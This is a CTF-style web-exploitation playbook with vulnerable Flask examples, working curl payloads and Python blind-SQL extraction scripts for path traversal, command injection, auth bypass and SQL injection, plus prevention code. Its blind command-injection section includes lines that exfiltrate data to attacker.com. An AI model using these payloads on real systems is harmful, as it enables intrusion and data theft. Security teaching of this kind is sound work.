# 🧪 Web Security & CTF Exploitation Playbook

A comprehensive guide covering SQL Injection, Command Injection, Authentication Bypass, Path Traversal, and Blind Exploitation techniques.

---

## Table of Contents
- [1. Introduction](#1-introduction)
- [2. Path Traversal](#2-path-traversal)
- [3. Command Injection](#3-command-injection)
- [4. Authentication Bypass](#4-authentication-bypass)
- [5. SQL Injection](#5-sql-injection)
- [6. Blind SQL Injection](#6-blind-sql-injection)
- [7. URL Encoding Reference](#7-url-encoding-reference)
- [8. Useful curl Commands](#8-useful-curl-commands)
- [9. Prevention & Best Practices](#9-prevention--best-practices)

---

## 1. Introduction

This playbook documents various web security vulnerabilities and their exploitation techniques encountered in CTF challenges. Each section includes:
- The vulnerable code
- The exploitation technique
- Working payloads
- Prevention methods

---

## 2. Path Traversal

### 2.1 Basic Path Traversal

**Vulnerable Code:**
```python
@app.route("/package/<path:path>")
def challenge(path="index.html"):
    requested_path = app.root_path + "/files/" + path
    return open(requested_path).read()
```

**The Problem:** The server concatenates user input directly with a base path without sanitization.

**Exploitation:**
```bash
# Read /etc/passwd
curl --path-as-is "http://challenge.localhost:80/package/../../../etc/passwd"

# Read the flag
curl --path-as-is "http://challenge.localhost:80/package/../../../flag"
curl --path-as-is "http://challenge.localhost:80/package/../../../flag.txt"
curl --path-as-is "http://challenge.localhost:80/package/../../../../flag"
```

**Why `--path-as-is` is Important:**
- `curl` normalizes URLs by default (removes `../`)
- `--path-as-is` preserves `../` sequences
- Without it, path traversal fails

**Prevention:**
```python
import os

def safe_path(path):
    full_path = os.path.abspath(os.path.join(app.root_path, "files", path))
    if not full_path.startswith(os.path.abspath(app.root_path + "/files/")):
        raise ValueError("Path traversal detected")
    return full_path
```

---

## 3. Command Injection

### 3.1 Basic Command Injection

**Vulnerable Code:**
```python
@app.route("/checkpoint")
def challenge():
    arg = flask.request.args.get("target", "/challenge")
    command = f"ls -l {arg}"
    result = subprocess.run(command, shell=True, ...)
```

**Exploitation:**
```bash
# Read the flag
curl "http://challenge.localhost:80/checkpoint?target=;cat%20/flag"

# Multiple commands
curl "http://challenge.localhost:80/checkpoint?target=;whoami;id;cat%20/flag"

# Find the flag file
curl "http://challenge.localhost:80/checkpoint?target=;find%20/%20-name%20%22flag*%22%202>/dev/null"
```

### 3.2 Bypassing Filters

**Vulnerable Code:**
```python
arg = flask.request.args.get("folder", "/challenge").replace(";", "")
command = f"ls -l {arg}"
```

**Bypass Techniques:**

| Character | URL Encoding | Purpose |
|-----------|--------------|---------|
| `&&` | `%26%26` | AND operator |
| `||` | `%7C%7C` | OR operator |
| `\|` | `%7C` | Pipe |
| `&` | `%26` | Background |
| `\n` | `%0A` | Newline |
| `` ` `` | `%60` | Command substitution |
| `$()` | `%24%28%29` | Command substitution |

**Working Payloads:**
```bash
# Using && (bypasses ; filter)
curl "http://challenge.localhost:80/puzzle?folder=/challenge%26%26cat%20/flag"

# Using newline
curl "http://challenge.localhost:80/puzzle?folder=/challenge%0Acat%20/flag"

# Using pipe
curl "http://challenge.localhost:80/puzzle?folder=/challenge%7Ccat%20/flag"

# Using command substitution
curl "http://challenge.localhost:80/puzzle?folder=$(cat%20/flag)"

# Using ${IFS} if spaces are blocked
curl "http://challenge.localhost:80/puzzle?folder=/challenge%26%26cat${IFS}/flag"
```

### 3.3 Blind Command Injection

**Vulnerable Code:**
```python
command = f"touch {arg}"
# Output is captured but NOT displayed!
```

**Exploitation Techniques:**

```bash
# 1. Time-based detection
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20sleep%205"

# 2. Write output to web-accessible file
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20cat%20/flag%20%3E%20/var/www/html/flag.txt"
curl "http://challenge.localhost:80/flag.txt"

# 3. Write to /tmp and check via error
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20cat%20/flag%20%3E%20/tmp/flag"

# 4. DNS exfiltration
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20nslookup%20$(cat%20/flag%20|%20base64).attacker.com"

# 5. HTTP exfiltration
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20curl%20-d%20%22$(cat%20/flag)%22%20http://attacker.com/collect"
```

**Prevention:**
```python
# NEVER use user input directly in shell commands

# Use parameterized APIs
subprocess.run(["ls", "-l", arg])  # Safe - no shell

# Or sanitize input
import shlex
safe_arg = shlex.quote(arg)
os.system(f"ls -l {safe_arg}")
```

---

## 4. Authentication Bypass

### 4.1 Trusted URL Parameter

**Vulnerable Code:**
```python
@app.route("/", methods=["GET"])
def challenge_get():
    username = flask.request.args.get("session_user", None)
    if username == "admin":
        page += "Flag: " + open("/flag").read()
```

**Exploitation:**
```bash
# Just set session_user=admin in the URL
curl "http://challenge.localhost:80/?session_user=admin"
```

### 4.2 Trusted Cookie

**Vulnerable Code:**
```python
@app.route("/", methods=["GET"])
def challenge_get():
    username = flask.request.cookies.get("session_user", None)
    if username == "admin":
        page += "Flag: " + open("/flag").read()
```

**Exploitation:**
```bash
# Set the cookie directly
curl -b "session_user=admin" "http://challenge.localhost:80/"

# Or with header
curl -H "Cookie: session_user=admin" "http://challenge.localhost:80/"
```

### 4.3 SQL Injection Authentication Bypass

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
```

**Exploitation:**
```bash
# Pin/Password injection (no quotes)
curl -X POST "http://challenge.localhost:80/session" \
  -d "account-name=admin" \
  -d "pin=0 OR 1=1 --"

# Username injection (with quotes)
curl -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' --" \
  -d "security-token=anything"

# OR injection
curl -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' OR '1'='1" \
  -d "security-token=anything"

# Using # comment
curl -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' #" \
  -d "security-token=anything"
```

**One-Liner to Get Flag:**
```bash
curl -L -X POST "http://challenge.localhost:80/user-login" \
  -d "user=admin' --" \
  -d "security-token=anything" \
  -c cookies.txt -b cookies.txt | grep -o "flag{[^}]*}"
```

---

## 5. SQL Injection

### 5.1 UNION Injection

**Vulnerable Code:**
```python
sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
```

**Exploitation:**
```bash
# Get admin's password (the flag)
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT password FROM users WHERE username="admin" --'

# Get all tables
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT name FROM sqlite_master WHERE type="table" --'

# Get table schema
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT sql FROM sqlite_master WHERE type="table" --'

# Get all users and passwords
curl 'http://challenge.localhost:80/?query=admin" UNION SELECT username || ":" || password FROM users --'
```

**URL Encoded Version:**
```bash
curl "http://challenge.localhost:80/?query=admin%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=%22admin%22%20--"
```

### 5.2 Union Injection with Different Column Counts

**If UNION fails, try different column counts:**
```bash
# 1 column
admin" UNION SELECT password FROM users --

# 2 columns
admin" UNION SELECT username, password FROM users --

# 3 columns
admin" UNION SELECT rowid, username, password FROM users --
```

### 5.3 Getting Data from sqlite_master

```bash
# Get all tables
admin" UNION SELECT name FROM sqlite_master WHERE type="table" --

# Get all table schemas
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" --

# Get specific table schema
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" AND name="users" --

# Get all indexes
admin" UNION SELECT name FROM sqlite_master WHERE type="index" --
```

---

## 6. Blind SQL Injection

### 6.1 Boolean-Based Blind Injection

**Vulnerable Code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
user = db.execute(query).fetchone()
if user:  # Login success (302)
    flask.session["user"] = username
else:    # Login failure (403)
    flask.abort(403)
```

**Exploitation:**

```bash
# Test if injection works
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR 1=1 --" \
  -v 2>&1 | grep "302"  # Should return 302

# Always false (should return 403)
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' AND 1=2 --" \
  -v 2>&1 | grep "403"  # Should return 403
```

**Extracting Flag with SUBSTR:**

```bash
# Check if first character is 'p'
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'p' --" \
  -v 2>&1 | grep "302"

# Check if first character is 'f'
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 'f' --" \
  -v 2>&1 | grep "302"
```

**Python Extraction Script:**
```python
import requests

def get_flag():
    base = "http://challenge.localhost:80/"
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
    flag = "p"  # First character found
    pos = 2
    
    while True:
        for c in chars + "}":
            payload = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin') = '{c}' --"
            r = requests.post(base,
                data={"username": "admin", "password": payload},
                allow_redirects=False
            )
            if r.status_code == 302:
                flag += c
                print(f"Found: {flag}")
                if c == '}':
                    return flag
                break
        pos += 1

print(f"Flag: {get_flag()}")
```

### 6.2 Binary Search for Faster Extraction

```python
import requests

def get_char_at_position(pos):
    """Binary search for character at position"""
    low, high = 32, 126  # ASCII printable range
    
    while low < high:
        mid = (low + high) // 2
        payload = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin') <= CHAR({mid}) --"
        r = requests.post('http://challenge.localhost:80/',
            data={'username': 'admin', 'password': payload},
            allow_redirects=False)
        if r.status_code == 302:
            high = mid
        else:
            low = mid + 1
    
    return chr(low)

# Extract flag using binary search
flag = ""
pos = 1
while True:
    char = get_char_at_position(pos)
    flag += char
    print(f"Position {pos}: {char} → {flag}")
    if char == '}':
        break
    pos += 1

print(f"Flag: {flag}")
```

### 6.3 Time-Based Blind Injection

**When boolean injection doesn't work, use time-based:**

```bash
# Test time-based injection
curl "http://challenge.localhost:80/puzzle?file=/challenge/PWN%3B%20sleep%205"

# Check character with time delay
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=' AND (SELECT CASE WHEN SUBSTR(password,1,1)='f' THEN 1 ELSE 0 END) = 1 AND sleep(3) --"
```

**Python Time-Based Script:**
```python
import requests
import time

def check_char(pos, char):
    payload = f"' AND (SELECT CASE WHEN SUBSTR(password,{pos},1)='{char}' THEN 1 ELSE 0 END) = 1 AND sleep(3) --"
    start = time.time()
    requests.post('http://challenge.localhost:80/',
        data={'username': 'admin', 'password': payload})
    elapsed = time.time() - start
    return elapsed >= 3  # If it slept for 3 seconds, condition was true
```

---

## 7. URL Encoding Reference

| Character | URL Encoding | Purpose |
|-----------|--------------|---------|
| `"` | `%22` | Double quote (SQL strings) |
| `'` | `%27` | Single quote (SQL strings) |
| Space | `%20` | Space in URL |
| `;` | `%3B` | Command separator |
| `&&` | `%26%26` | AND operator |
| `||` | `%7C%7C` | OR operator |
| `\|` | `%7C` | Pipe operator |
| `&` | `%26` | Background execution |
| `\n` | `%0A` | Newline |
| `\t` | `%09` | Tab |
| `$` | `%24` | Dollar sign |
| `(` | `%28` | Left parenthesis |
| `)` | `%29` | Right parenthesis |
| `` ` `` | `%60` | Backtick |
| `#` | `%23` | Hash |
| `-` | `%2D` | Dash |
| `/` | `%2F` | Forward slash |
| `\` | `%5C` | Backslash |
| `:` | `%3A` | Colon |
| `=` | `%3D` | Equals sign |
| `?` | `%3F` | Question mark |
| `@` | `%40` | At sign |
| `+` | `%2B` | Plus sign |
| `%` | `%25` | Percent sign |

### URL Encoding Example

**Payload:**
```sql
admin" UNION SELECT password FROM users WHERE username="admin" --
```

**URL Encoded:**
```
admin%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=%22admin%22%20--
```

---

## 8. Useful curl Commands

### 8.1 GET Requests

```bash
# Basic GET
curl "http://challenge.localhost:80/"

# GET with parameters
curl "http://challenge.localhost:80/?query=admin"

# GET with --path-as-is (for path traversal)
curl --path-as-is "http://challenge.localhost:80/package/../../../flag"

# GET with cookies
curl -b "session=admin" "http://challenge.localhost:80/"
```

### 8.2 POST Requests

```bash
# Basic POST
curl -X POST "http://challenge.localhost:80/" \
  -d "username=admin" \
  -d "password=password"

# POST with URL encoded data
curl -X POST "http://challenge.localhost:80/" \
  --data-urlencode "username=admin" \
  --data-urlencode "password=' OR 1=1 --"

# POST with JSON
curl -X POST "http://challenge.localhost:80/" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"password"}'

# POST with file upload
curl -X POST "http://challenge.localhost:80/upload" \
  -F "file=@payload.txt" \
  -F "filename=; cat /flag"
```

### 8.3 Cookie Management

```bash
# Save cookies to file
curl -c cookies.txt "http://challenge.localhost:80/login"

# Send cookies from file
curl -b cookies.txt "http://challenge.localhost:80/"

# Set a specific cookie
curl -b "session=admin" "http://challenge.localhost:80/"

# Send cookie as header
curl -H "Cookie: session=admin" "http://challenge.localhost:80/"
```

### 8.4 Verbose and Debugging

```bash
# Show full request/response
curl -v "http://challenge.localhost:80/"

# Show only headers
curl -I "http://challenge.localhost:80/"

# Show request headers only
curl -v "http://challenge.localhost:80/" 2>&1 | grep ">"

# Show response headers only
curl -v "http://challenge.localhost:80/" 2>&1 | grep "<"

# Follow redirects
curl -L "http://challenge.localhost:80/"

# Save output to file
curl -o output.txt "http://challenge.localhost:80/"

# Silent mode (no progress bar)
curl -s "http://challenge.localhost:80/"
```

### 8.5 One-Liners for Common Tasks

```bash
# Get flag from SQL injection
curl -s -X POST "http://challenge.localhost:80/login" \
  -d "username=admin' --" \
  -d "password=anything" \
  -c cookies.txt && \
curl -s -L "http://challenge.localhost:80/" \
  -b cookies.txt | grep -o "flag{[^}]*}"

# Extract first character (blind SQL)
for c in {a..z} {A..Z} {0..9}; do
    curl -s -X POST "http://challenge.localhost:80/" \
        -d "username=admin" \
        -d "password=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = '$c' --" \
        -v 2>&1 | grep -q "302" && echo "First char: $c" && break
done

# Test command injection
curl "http://challenge.localhost:80/checkpoint?target=;sleep%205" \
  --max-time 3 && echo "Not vulnerable" || echo "Vulnerable!"

# Path traversal enumeration
for i in {1..10}; do
    traversal=$(printf '../%.0s' $(seq 1 $i))
    curl -s -o /dev/null -w "%{http_code}" \
        "http://challenge.localhost:80/package/${traversal}flag"
done
```

---

## 9. Prevention & Best Practices

### 9.1 SQL Injection Prevention

**Use Parameterized Queries (ALWAYS!):**
```python
# ❌ VULNERABLE
query = f"SELECT * FROM users WHERE username = '{username}'"
db.execute(query)

# ✅ SECURE
query = "SELECT * FROM users WHERE username = ?"
db.execute(query, (username,))
```

**Input Validation:**
```python
# Whitelist approach
allowed = ["admin", "guest", "user"]
if username in allowed:
    query = "SELECT * FROM users WHERE username = ?"
    db.execute(query, (username,))
```

### 9.2 Command Injection Prevention

**Use Parameterized APIs:**
```python
# ❌ VULNERABLE
os.system(f"ls -l {user_input}")

# ✅ SECURE
subprocess.run(["ls", "-l", user_input])  # No shell!

# ✅ SECURE (if shell is necessary)
import shlex
safe_input = shlex.quote(user_input)
os.system(f"ls -l {safe_input}")
```

### 9.3 Authentication Best Practices

```python
# ❌ VULNERABLE - Trusting client data
username = request.args.get("session_user")
if username == "admin":
    show_flag()

# ✅ SECURE - Server-side sessions
session_token = request.cookies.get("session")
if session_token in sessions:
    username = sessions[session_token]
    if username == "admin":
        show_flag()
```

### 9.4 Path Traversal Prevention

```python
import os

def safe_path(user_path):
    # Get absolute path
    full_path = os.path.abspath(os.path.join(BASE_DIR, user_path))
    
    # Ensure it's within BASE_DIR
    if not full_path.startswith(BASE_DIR):
        raise ValueError("Path traversal detected")
    
    return full_path
```

### 9.5 General Security Guidelines

1. **Never trust user input** - Validate and sanitize everything
2. **Use parameterized queries** for all database operations
3. **Avoid shell commands** when possible
4. **Use server-side sessions** instead of trusting client data
5. **Implement proper authentication** with session tokens
6. **Use HTTPS** to prevent man-in-the-middle attacks
7. **Keep dependencies updated** to patch known vulnerabilities
8. **Use Content Security Policy (CSP)** headers
9. **Implement rate limiting** to prevent brute force attacks
10. **Log and monitor** suspicious activities

---

## Quick Reference Card

### SQL Injection Payloads
```bash
# Basic bypass
admin' --
admin' OR 1=1 --
admin' OR '1'='1
admin' AND 1=1 --

# UNION injection
admin" UNION SELECT password FROM users --
admin" UNION SELECT name FROM sqlite_master --
admin" UNION SELECT sql FROM sqlite_master WHERE type="table" --

# Blind injection
admin' AND SUBSTR(password,1,1)='f' --
admin' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='f' --
```

### Command Injection Payloads
```bash
# Command separators
; cat /flag
&& cat /flag
|| cat /flag
| cat /flag
%0Acat%20/flag

# Space bypass
cat${IFS}/flag
cat%09/flag
cat{,,}/flag

# Command substitution
$(cat /flag)
`cat /flag`
```

### Authentication Bypass
```bash
# URL parameter
?session_user=admin

# Cookie
Cookie: session_user=admin

# SQL injection
username=admin' --
password=' OR 1=1 --
```

### Path Traversal
```bash
# Basic traversal
../../../flag
../../../../etc/passwd

# Encoded traversal
%2e%2e%2f%2e%2e%2f%2e%2e%2fflag
%252e%252e%252fflag
..%2f..%2f..%2fflag
```

---

## License

This playbook is for educational purposes only. Use responsibly and only on systems you have permission to test.

---

**Happy Hacking! 🚀**
